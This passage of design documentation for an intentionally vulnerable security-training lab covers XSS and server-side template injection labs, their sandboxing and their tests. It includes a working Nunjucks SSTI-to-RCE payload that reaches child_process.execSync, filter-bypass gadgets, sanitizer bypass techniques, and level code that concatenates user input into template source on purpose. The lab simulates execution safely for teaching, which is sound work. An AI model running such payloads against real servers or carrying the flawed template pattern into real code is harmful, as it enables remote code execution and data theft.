  server's own parser, and never send the player's DTD through the oracle.) A `Content-Security-Policy: sandbox`
  applies; other CSP directives are not evaluated. Per the SC-05
  amendment, the citadel serves the sigil inline inside an HTML page, the real route always sends an inert download,
  and the payload fires only in the preview.
- **SC-05, the worked example of served markup** (`scriptorium/sc-05-svg-xss/`). Each level exports `accept(svg)`
  (its upload filter: refuse, or the text to store) and `review(sigil)`: the gallery's WHOLE answer to the moderator's
  `GET /review`, every header and the body, which the citadel handler returns as a raw `SimResponse` (a `Reply`
  carries no Content-Type or Content-Disposition). Acolyte and Templar answer an HTML page with the sigil inline,
  Inquisitor the file itself as `image/svg+xml` (read as XML), Divine an HTML page with the source escaped in a `<pre>`
  and a download link. No level puts a CSP on the review page: a `sandbox` there would hide a Divine that inlines (the
  oracle would see nothing run), and other directives are not evaluated anyway. One sigil per player (an upload
  replaces it), at most 12 KiB (`receive(req, 'sigil', { maxFileBytes: 12 * 1024 })`), so every review page stays under
  the oracle's 16 KiB and is judged whole (the spec checks the largest sigil at every level). The victim is a custom
  action (follow `/review`, after re-arming the moderator's session) that returns a note when the payload did not run:
  the verdict's `wellFormed: false`, `limited`, or `reachedMarker` with nothing run. The preview frame shows the
  review's body whenever the moderator's browser renders it. **At Inquisitor that body is XML, but the preview draws it
  inside an HTML page**, which forgives what an XML reader refuses (a missing `xmlns`, an unclosed tag): the page says
  so, and the note tells the player why the moderator's browser ran nothing; which reading applies comes from the
  engine's own rule (`rendersDocument(review.headers)`), never a lab copy of it. The real `GET /sigil` (and the
  citadel's) is the inert download at every level: its CSP `sandbox` through `setLabHeaders` (`labHeaders` in the twin),
  its type, `nosniff` and `attachment` (outside that allow-list) through `res.set`. Inquisitor and Divine refuse any
  `<!DOCTYPE` (a superset of "an internal subset": a quoted `>` in the external id cannot slip a subset past it).
  **A sanitizer written as text rules must know where tags are** (review M1): Inquisitor's first stripper ran over the
  whole text, so a quote opened in text, a comment or CDATA swallowed a later start tag as an attribute value and kept
  its handler. It now reads comments, CDATA and processing instructions past whole, strips inside each start tag only
  (any XML name starts one, not only ASCII letters), drops `srcdoc`, and drops a `javascript:` URL from `href`, `src`,
  `action` and `formaction` under any prefix once character references are undone and tabs and newlines removed, so
  only SVG's own gap is left: SMIL events and a SMIL `href` animation. **Preview fidelity:** every SVG link solve
  fires in the preview when clicked (Chrome 157, on the level-built preview): `href`, `xlink:href` with or without an
  `xmlns:xlink` declaration, and an `href` set by SMIL `animate` or `set` (the shim reads an SVG anchor's effective
  `href`, below).
- **HTML mail (FP-12).** Mail clients run no script. `linkSinks(html)` lists every link and resource URL in document
  order (`a`, `area`, `form`, `img`/`srcset`, CSS `url()`/`@import` ...), parsed with scripting off as a mail client
  parses. Build the mail's `links` from it, and classify each URL with `classifySimUrl`. It reports `link` with
  trigger `interaction` (the admin clicks) and `resource` with trigger `load` (the client fetches it).

### Bounds (`XSS_LIMITS`)

parse5 is synchronous, and its worst inputs are superlinear: one tag with thousands of distinct attributes; deep or
misnested trees; an unclosed formatting element (`<b>`, `<a>`) rebuilt inside every later block. So every oracle call
is bounded:

- **Before parsing:** at most 16 KiB of page (`htmlLength`) and 1024 tag openers (`tags`, which bounds depth and
  parse5's per-token scope checks).
- **While parse5 builds the tree:** a tree adapter counts every element it creates, rebuilt copies included. The caps
  are 4096 elements (`elements`) and 128 K characters of attribute text (`attributeText`).
- **Refusals:** a page over any of these is refused whole and deterministically, `executes: false, limited:
  'size' | 'tags' | 'nodes'` (and `'dtd'` for an XML document, above). A framed document over them is skipped
  (`'nodes'`, `'srcdoc'` past 2 frames deep).
- **XML documents and `data:` SVG images** go through the XML reader under the same 16 KiB, 1024-tag and tree caps.
  An image over them is not judged, and each image is read once per call. An element copies its namespace scope only
  when it declares a namespace.
- **The mXSS round trip** runs only on trees at most 512 deep (parse5 serializes recursively). Its exact serialized
  length is computed before it is built. One parse budget covers the page, its frames, the select pass and the round
  trips (`'budget'`).
- **Time never changes `executes` or `sinks`.** The page, its framed documents and the select pass are always read
  whole, which the caps above guarantee finishes. Only the mXSS round trips stop for time: 250 ms after the call began
  (`timeMs`), checked before each round trip and every 256 elements inside its parse. A late call answers
  `mxss: false, limited: 'time'` with the same `executes`.
- **No regex that sees attacker text backtracks.** Trims are index loops and CSS URLs are scanned by hand
  (`tests/xss.spec.ts`, "stays linear").

Keep citadel pages under 16 KiB: cap stored items, and per the amendment keep an SVG sigil at about 12 KiB.

Measured at the caps (Node 22.22, parse5 8.0.1, warm), over the re-review's 45 worst-case inputs:
- The worst input is one tag with 16 KiB of distinct attributes, because parse5's own duplicate-attribute check is
  quadratic. Behind a `<select>` and a `<noscript>`, it is read by every pass the parse budget allows (the page, the
  select pass, a round trip) and costs about 70 ms, or 90 ms cold. Every input outside that family costs under 25 ms warm (35 ms cold).
- XML costs little: a document with 900 `xmlns:` prefixes and 1020 elements takes about 2 ms. A `data:` SVG image
  with hundreds of prefixes, behind a select and a noscript, takes 2.5 to 4.5 ms (8 ms cold); it took up to 555 ms
  before namespace scopes were copied only on write and each image was read only once.
- The first review's inputs are refused early: an unclosed link with a 13 K href copied into 400 blocks in 0.4 ms, and
  400 formatting elements rebuilt in 300 blocks in 3.3 ms.
- A realistic 5 KB lab page takes about 1.5 ms.

A victim action blocks for that long at most: a self-DoS in a single-player loopback lab, like the SQL residual in
section 4.

Verdicts list at most 16 sinks with 80-char details, and `linkSinks` at most 64 URLs. An XSS browser keeps its last 5
page verdicts. In the shared byte budget (section 8) it weighs `XSS_LIMITS.verdictsWeight` (64 KiB; about 53 KiB measured at
worst), on top of its world's and its browser's own weights.
Every string kept is a copy.

### Player safety

- The preview is `<iframe sandbox="allow-scripts" srcdoc="...">`, never `allow-same-origin`, so it gets an opaque
  origin: `document.cookie` and `parent.document` throw. Its document starts with a meta CSP that lets no request out
  (`default-src 'none'`), and a shim that turns `hvwa()` and `alert()` into a text banner naming the player's own
  marker. Checked in headless Chrome 157. A route-scoped CSP on the lab page applies inside it too, because srcdoc
  inherits it.
- **`javascript:` links run in the preview through the shim.** A `sandbox="allow-scripts"` frame never runs a
  `javascript:` URL a click navigates to (Chrome 157, with or without the meta CSP), so a link payload the oracle
  counts would never be seen firing. The shim catches the click on an `a` or `area`, or on a submit button with a form
  owner (its `formaction`, else the form's `action`), and reads the link's EFFECTIVE URL: an HTML `a` or `area` its
  `href` attribute, an SVG `a` its `href.animVal` (the `href` attribute, else `xlink:href` whether its namespace was
  declared or not, or while a SMIL `animate` or `set` of `href` runs, the value it set). An anchor that is no link (no `href`, or an
  SVG anchor whose effective `href` is empty) lets the click go on to the nearest link or button around it. The shim
  decodes the URL exactly as the oracle does (`urlText`,
  `schemeOf`, `javascriptSource`: C0 controls and spaces trimmed, tabs and newlines removed, the scheme compared
  case-insensitively, the rest percent-decoded as UTF-8; entities are undone by the parser), cancels the navigation and
  runs the code as an inline script in the frame. The frame stays sandboxed with no `allow-same-origin`; a page CSP
  without `'unsafe-inline'` blocks it, as it blocks every inline payload. `tests/xss-preview.spec.ts` checks the
  decoding against the oracle's own functions.
- `hvwa_sid` is HttpOnly and `SameSite=Lax`: no script anywhere reads the player's session.
- Raw lab input reaches only the preview frame; everything else is escaped. Residual risk, accepted: all labs share
  the loopback origin, so a payload the player pastes into their own address bar or devtools can script their own
  platform page.
- A Divine level that adds a CSP sets it on its own route with `setLabHeaders` (section 4, "Lab headers"), never
  globally, and puts the same lines (`labHeaders`) in its citadel twin's answer.

### Testing

- **The guard (`tests/xss.spec.ts`).** It holds the sink matrix, the Chrome 157 rows (declarative shadow DOM, the
  select pass, SMIL `href`, precision, form owners, `data:` images and tracks, XML documents and DTDs), escaped
  negatives, mXSS corpora, marker reachability,
  per-player isolation, the bounds (including the linear-time and mocked-clock cases), `linkSinks` and the preview's
  attributes (`tests/xss-preview.spec.ts`: its `javascript:` link runner). It also guards imports: `core/xss/` imports
  only parse5 and `sim/limits.ts` (the copying clip), with no dynamic `import()`, no network, file system, `vm`,
  `child_process` or code-loading global; parse5 and entities import no Node builtin at all; `core/sim/` never
  reaches `core/xss/`.
- **The victim wrap (`tests/xss-victim.spec.ts`).** In process: what renders, what fires, the canary (read after the
  page's `Set-Cookie`), content types (XML read as XML), CSP sandbox, the `dom` twin, its hash and its failures, and
  the bound on kept verdicts.
- **The XSS lab kit (`src/districts/_shared/xss-lab.testkit.ts`, section 1).** `describeXssLab` runs the cases below
  that every server-sink XSS lab shares (the preview holds the fragment and runs it only isolated, one steal with no
  Referer, Divine never fires, only the whole session key signs in, players and levels isolated); a lab spec adds its
  own (re-arm, bounds, Restart, the Divine sanitizer on a corpus).
- **A lab spec**, like XV-01, scripts the exploit as a player would. It reads the marker from the page (put it in
  `<code data-marker>`), sends the link (`POST <lab>/victim/send-link`), reads the canary from the attacker log
  (`attackerHits(html)`, the hit whose URL starts with `XSS_STEAL_URL`), then completes the attack.
- **Add these cases:**
  - the preview's srcdoc ends with `<body>` + the level's fragment + `</body></html>`;
  - `xssOracle(labPage.text, marker)` finds the marker sinks only `isolated` (the payload never runs on the platform
    page);
  - Divine's admin never fired (`labFor(...).admin.verdicts`: `fired` false, no `limited`) and saw the marker as text
    (`reachedMarker` true). **The "as text" half holds for an ESCAPING Divine only**: a sanitizing Divine drops the
    marker together with the attribute or element it sat in, so there only some payloads reach the page as text;
    `describeXssLab({ ..., divineSanitizes: true })` then asks for at least one (SC-02, FP-05, and SC-04, whose refused
    link keeps only its label);
  - players and levels are isolated;
  - a logout link does not wedge the victim (re-arm);
  - for a level that serves player XML: Divine never produces `limited: 'dtd'` (it refuses a DOCTYPE with an
    internal subset before the admin's browser sees it).

## 14. SSTI labs (`core/ssti`)

FP-06 (SSTI with Nunjucks) and FP-07 (SSTI -> RCE, levels A/I/D) render a template that the player controls in part.
**Nunjucks runs only inside a QuickJS-WASM interpreter**, never in the host realm. Each render gets a fresh WASM
instance, in one long-lived `worker_thread` (owner decisions Q2 and Q3; no extra service). **"RCE" is simulated**
(Q7): the template reaches a FAKE `child_process`, whose shell answers from files the lab planted. Nothing ever runs
on the host. Import everything from `core/ssti/sandbox.ts`:

- `engine.ts`: the engine. It is also the worker entry.
- `transport.ts`: the worker, and the in-thread test transport.
- `sandbox.ts`: the API.

### Rendering a player template at each level

```ts
// levels/acolyte.ts — the flaw: player input concatenated into the template SOURCE
export const banner = (input: string): Banner => ({ template: `Hi ${input}!`, autoescape: false });
// levels/divine.ts — never compile input: a constant template, the input as DATA (autoescape on)
export const banner = (input: string): Banner => ({ template: 'Hi {{ name }}!', data: { name: input } });

// challenge.ts (or model.ts)
const b = impl.for(req.level).banner(field(req, 'greeting'));
const r = await renderInSandbox({
  template: b.template,
  ctx: { ...b.data, secret: req.level === 'divine' ? NO_FLAG : flagFor(req, FP06) }, // FP-06: the planted context var
  node: fakeNodeFor(req),        // FP-07 only, below
  autoescape: b.autoescape ?? true,
});
if (r.limit === 'busy') res.status(503).set('Retry-After', '1');
await sendPage(res, view, { banner: r.ok ? r.output : null, error: r.ok ? null : shown(req, r), commands: r.shellCalls });
```

- **The level decides what the template SOURCE is**, in its own file. That is the whole flaw, so View Source and the
  Diff show it:
  - Acolyte concatenates;
  - Templar strips `{{`/`}}`;
  - Inquisitor concatenates one field, or blocks `constructor`/`__proto__` substrings;
  - Divine passes a constant template and the input as `ctx` data.
  The sandbox bounds what any source can do. It never decides whether the source is safe.
- **`renderInSandbox(input)` resolves to an `SstiResult` and never rejects for anything a template does.**
  - `{ ok: true, output, shellCalls }`.
  - `{ ok: false, error, shellCalls }`: a template error, with Nunjucks' own message ("Template render error: ..."),
    clipped to 500 characters. That includes QuickJS's own `InternalError: out of memory` (one allocation over its
    32 MiB limit) and `InternalError: stack overflow` (recursion past its 128 KiB stack): the template can catch
    both, so they are its errors, not limits.
  - `{ ok: false, error, limit }`: the HOST stopped the render. `limit` comes from host signals only, never from
    text the template wrote (it can `throw 'stack overflow'`, which stays an ordinary error). It is one of:
    - `input` (the template or context is over its cap);
    - `timeout` (the interrupt handler's deadline, a render that ended late, or the render-phase watchdog);
    - `memory` (the interrupt handler's check of the instance's memory: uncatchable);
    - `stack` (a native stack overflow under QuickJS: the instance is dropped);
    - `output` (the copy is over the cap; lone surrogates count three characters each, as they arrive);
    - `busy` (the queue is full; answer 503 with `Retry-After`);
    - `crashed` (the worker died, or its boot wedged; the next render starts a fresh one).
  A malformed call (no string template, a function or a `Date` in `ctx`, a relative path in `node.files`) is a lab
  bug and throws.
- **Show errors like `tryDb` does**: the message below Divine (error-based learning), a generic one at Divine
  (`shown(req, r)`). The message is text the player controls (`throw '...'` works), so show it escaped.
- **Show `output` escaped too** (the escaped output tag), whatever `autoescape` is. The lesson is template injection,
  not XSS: a level that turns autoescape off changes only what Nunjucks prints.
- **`ctx` is JSON data only**: plain objects, arrays, strings, finite numbers, booleans and null, at most 16 KiB as
  JSON. A template cannot reach a function the lab did not write, because none crosses. Nunjucks' own globals
  (`range`, `cycler`, `joiner`) are in every render: they are the object-graph escape FP-07 teaches.
  `include`/`import`/`extends` find nothing (the environment has no loaders).
- **Bound the player's field** below `SSTI_LIMITS.templateChars` (4096). The engine refuses a longer template
  (`limit: 'input'`), but the lab's own cap gives the clearer message. Keep stored player strings clipped
  (section 8), like any lab state.

### The flag, and the fake bridge (FP-07)

- **FP-06: the flag is a context variable.** Plant `secret: flagFor(req, FP06)` below Divine and a constant
  placeholder at Divine (`flagFor` throws there). It reaches the banner only when the input was evaluated as a
  template (`{{ secret }}`). `{{ 7*7 }}` printing `49` is the "it evaluates" tell.
- **FP-07: the flag is a file on the simulated machine.** Plant it, again only below Divine (an env var such as
  `FLAG` is the other planted path, through `process.env`):

  ```ts
  const fakeNodeFor = (req: Request): FakeNode =>
    ({ files: { '/srv/forum/flag': `${req.level === 'divine' ? NO_FLAG : flagFor(req, FP07)}\n` } });
  ```

  - With `node`, the sandbox has a fake `process`: `env` (the planted vars over `NODE_ENV`, `HOME`, `USER`, `PATH`,
    `PWD`), `version`, `platform`, `pid`, `cwd()` and `mainModule.require`.
  - `require('child_process')` gives `execSync(cmd)`. Any other module throws `Cannot find module`, and `require` is
    not a global (it is not one in Node either).
  - So the classic payload works, through Nunjucks' own object graph:
    `{{ range.constructor("return global.process.mainModule.require('child_process').execSync('cat /srv/forum/flag')")() }}`.
    So do `cycler`/`joiner`, `"".__proto__.constructor.constructor` and `range["constr" ~ "uctor"]` (FP-07
    Inquisitor's gadget past a substring filter). Without `node`, `process` is undefined and nothing can be "run".
- **The fake shell** (`fakeShell`, in the worker, over the planted data):
  - Commands: `id`, `whoami`, `hostname`, `pwd`, `uname [-a]`, `ls`, `cat`, `echo`, `env`, `printenv` and `cd`.
  - Syntax: sequences with `;`, `&&`, `||` and newlines; quotes, backslashes and `$VAR` as `sh` has them.
  - Refused: anything else is `sh: 1: <name>: not found` (status 127). Pipes, redirections and substitutions are
    refused.
  - Errors: a non-zero status makes `execSync` throw `Command failed: <cmd>` with `status`, `stdout` and `stderr`,
    as Node does.
  - The machine is fictional on purpose, so its output never looks like the real host: user `scribe` (uid 1000),
    host `forum-of-pilgrims`, cwd `/srv/forum`, plus `/etc/passwd` and `/etc/hostname`.
  - **The planted path is the only way to the flag.** Every other command gets the machine's ordinary answer or
    "No such file or directory".
- **`shellCalls`** lists the commands the template ran, in order (the first 16, each clipped to 200 characters; a
  render that tries more than 64 gets "Cannot fork"). Show it on the page ("commands your template ran"), and use
  it in specs. The flag proof is the planted flag in `output`, which the player reads off the banner.

### Bounds (`SSTI_LIMITS`), measured

Measured on Node 22.22 (Windows, this machine), through the real worker.

| Bound | Value | Measured |
|---|---|---|
| Render deadline (QuickJS interrupt handler) | 250 ms default, 1000 max (`timeoutMs`) | `while (true)` and a nested `{% for %}` over `range` stop at 263 ms (p50, about 13 ms of it the fresh instance and Nunjucks' boot); 50 ms stops at 62 ms; catastrophic regex backtracking is interrupted too. A render that ends past its deadline is a timeout even when no interrupt fired (a native call never polls). |
| Memory | three layers, each tested alone: (1) the interrupt handler stops a render once the instance's WASM memory passes 28 MiB (`limit: 'memory'`, uncatchable); (2) QuickJS `setMemoryLimit` 32 MiB refuses one allocation (a 30 MiB buffer fits, 33 MiB is refused: a catchable `InternalError: out of memory`); (3) `WebAssembly.Memory` 16 MiB initial (the module's minimum), 48 MiB maximum, the backstop the other two always reach first | a small-object loop stops in about 62 ms, an `ArrayBuffer` loop in about 30 ms, `'x'.repeat(1e9)` at once. Over 200 consecutive bombs of seven kinds the process RSS went from 114.6 MiB (an idle worker) to a peak of 174.1 MiB (about 60 MiB above idle), and was 98.8 MiB after 20 normal renders. |
| Stack | QuickJS `setMaxStackSize` 128 KiB (734 nested JS calls, a catchable `InternalError`), worker stack 8 MB | QuickJS measures its WASM shadow stack, and the native frames behind its C recursion are 16 to 32 times larger: 128 KiB keeps the parser and JSON inside the worker's 8 MB, where a native overflow (`limit: 'stack'`) would drop the instance. `JSON.stringify` over a 200 000-deep value spends about 0.22 s in an uninterruptible cycle check before QuickJS's stack overflow. |
| Input | template 4096 chars, context 16 KiB as JSON, planted machine 16 files of 4 KiB, 16 env vars | refused before anything crosses |
| Output | 16 KiB of text; errors 500 chars | the host reads a primitive string's own length (no prototype can change it) and never copies a longer one |
| Worker | `resourceLimits` old space 48 MB, young 8 MB, code range 16 MB, stack 8 MB; no `env`, no `execArgv` | its V8 heap stays at 6.1 to 6.3 MiB over 3000 mixed renders (one bound in every ten), with no growth |
| Queue | 1 in flight + 8 waiting, then `busy` at once | |
| Watchdog | two phases, then `terminate()`: until the worker reports that the player's code started, `bootWatchdogMs` 1000 (the boot is about 15 ms; `bootMs`, its own interrupt deadline, is 500); from then on the deadline + `watchdogSlackMs` 250 | natives that never poll the interrupt handler (`indexOf` of a 5e5-character needle in 1e6 characters, a 1.04M-bit BigInt's `toString`) answer `timeout` at 516 to 550 ms instead of holding the worker for about 2.75 s; the next render starts a fresh worker in 165 to 330 ms |
| Cost | | cold start (spawn, load, two warm-up renders, first render) 160 to 220 ms; warm render p50 13.6 ms, p95 18.7 ms (an SSTI -> RCE render the same); an idle worker adds about 29 MiB of process RSS |

### Lifecycle: one long-lived worker

- `renderInSandbox` uses one default `workerTransport()`, started by the first render.
  - Renders run one at a time, in a fresh QuickJS-WASM instance each (about 1 ms to build from the compiled
    module).
  - A worker serves about 60 renders a second, so the container (`pids_limit: 256`, 512 MB) never needs a second
    one.
- The bounds behind the worker:
  - **Queue**: `SSTI_LIMITS.queue` renders may wait behind the one in flight; the next gets `busy` at once.
  - **Watchdog**, in two phases: the boot (`bootWatchdogMs`, until the worker reports `started`; a wedged boot
    answers `crashed`), then the player's code (`timeoutMs + watchdogSlackMs`; a native call that never polls the
    interrupt handler answers `timeout`). The worker is terminated either way.
  - **Drops**: a worker that dies, never gets ready (10 s), reports `fatal` or answers in a shape this protocol does
    not have is dropped. That render answers `crashed`, and the next one starts a fresh worker (never a restart
    loop). A SIZE past a cap is not a reason to drop a worker: the transport bounds it again (an output over the cap
    answers `output`, an error and the commands are clipped), so no template can get a healthy worker dropped.
- An idle worker is unref'd, so it never keeps the process up. A pending render or stats reply does. `server.ts`'s
  shutdown ends it with the process.
- The worker starts with no environment (`FLAG_SECRET` never reaches it) and no flags. It loads its two files,
  warms up, then **seals itself**. In its own realm, these throw from then on:
  - every function of `node:fs`, `fs/promises`, `child_process`, `net`, `http`, `https`, `http2`, `tls`, `dgram`,
    `dns`, `dns/promises`, `vm` and `inspector`, ENUMERATED (`SEALED_MODULES`), classes included;
  - `net.Socket.prototype.connect`, `process.binding`/`_linkedBinding`/`dlopen`/`kill`/`_kill`,
    `worker_threads.Worker`, and the global `fetch`, `WebSocket` and `EventSource`.

  `stats()` lists every sealed name. The guard spec keeps its own written list and checks each name is there,
  plus every function of `fs` and `fs/promises` that it enumerates itself.
- Measured numbers come from `workerTransport().stats()`: workers started and dropped, the live thread id, the
  queue, the worker's counters and its V8 heap. (It gives up after 5 s on a worker that never answers.)
- **Running from `src/`** (specs, `npm run dev`) loads `engine.ts` as the worker through Node's built-in type
  stripping, on by default from Node 22.18: hence `engines.node >= 22.18`. `dist/` runs plain JavaScript.

### Accepted residuals

- **One render can hold the worker about half a second, and one client can fill the queue.** A native call that
  never polls the interrupt handler runs until the render-phase watchdog: the deadline plus 250 ms (about 0.52 s at
  the default 250 ms; 1.25 s if a lab passes `timeoutMs: 1000`). The next render then waits 165 to 330 ms for a fresh
  worker. Nine such renders (one in flight, eight queued) keep everyone else at `busy` for about 6 to 8 s, down from
  about 26 s before the two-phase watchdog. On a loopback, single-player lab the only client who can do this is the
  player, stalling their own sandbox. It is accepted, like the SQL CPU gap (section 4).

### Why nothing executes for real

- QuickJS-WASM is a memory-safe interpreter. A template's code can touch only the instance's own linear memory.
  - The guest has no host bindings but one: the fake shell's bridge, and only when `node` is planted. It takes the
    command as a string (refused past 1000 characters, never copied out) and answers `{ status, stdout, stderr }` as
    JSON. It interprets data and spawns nothing.
  - No `process` (unless planted, and then fake), `require`, `fetch`, `console`, timers, `WebAssembly` or module
    loader exists in the sandbox. `import()` only makes a promise that never settles.
  - Template, context and output cross as strings and JSON only.
- Each render gets a fresh instance that is never reused. Nothing a template does survives into the next render,
  which may be another player's: not a polluted prototype, not a global, not a corrupted heap.
- On the host side, `tests/ssti-guard.spec.ts` parses `src/core/ssti/` with tsc against an allow-list, and pins
  the one exception to its call sites:
  - `node:fs`'s `readFileSync` is called twice, in `loadAssets()`, on the QuickJS `.wasm` and the Nunjucks browser
    bundle (read as TEXT);
  - `createRequire` resolves those two files and loads the builtins the seal replaces.

  The spec then runs a whole SSTI -> RCE flow, on the in-thread transport and through a real worker, with every fs,
  network, child-process and vm function spied. Nothing may be called, and the worker must report itself sealed.
- **Never import `nunjucks` in the host realm**, and never `eval`, `vm` or a real `child_process` for a lab. The
  guard fails on any of them in `core/ssti/`.

### Testing

- Lab specs use the in-thread transport (the same engine on the test's thread, no worker):
  `beforeAll(() => { prev = setSandboxTransport(inThreadTransport()); })` and `afterAll(() => setSandboxTransport(prev))`.
  Or use the default worker and `afterAll(closeSandbox)`. `tests/ssti-worker.spec.ts` keeps the two transports
  answering the same.
- `toJob(input)` builds the validated job, to call a transport directly.
- The exploit matrix applies as usual:
  - each exploit's banner shows the flag;
  - Divine prints the payload as text, with no flag and no error;
  - step-up holds (FP-07 Inquisitor refuses Acolyte's `constructor` payload);
  - `malformed` covers a template syntax error below Divine;
  - add a case that a timeout and a memory bomb each answer their limit, that a stack overflow is the template's
    own error, and that the next render works.
- **What `verify:docker` should check once Docker runs here:**
  - a burst of renders keeps the app's thread count well under `pids_limit` (one worker, plus V8's threads);
  - repeated memory bombs keep the app under `mem_limit` (about 60 MiB above an idle worker, measured in process);
  - the worker starts on the read-only rootfs and renders;
  - an SSTI -> RCE payload against the running container prints only the planted flag (no real `id`).
- **`verify:dist`**: the production build resolves the `.wasm` and the Nunjucks bundle from `node_modules` next to
  `dist/` (createRequire from `dist/core/ssti/engine.js`), and `dist/core/ssti/engine.js` is the worker entry. No
  asset copy is needed. `verify:dist` only GETs lab pages, so give FP-06/07's `GET /` a default banner rendered
  through the sandbox: `verify:dist` then exercises the worker from `dist/` on every run.
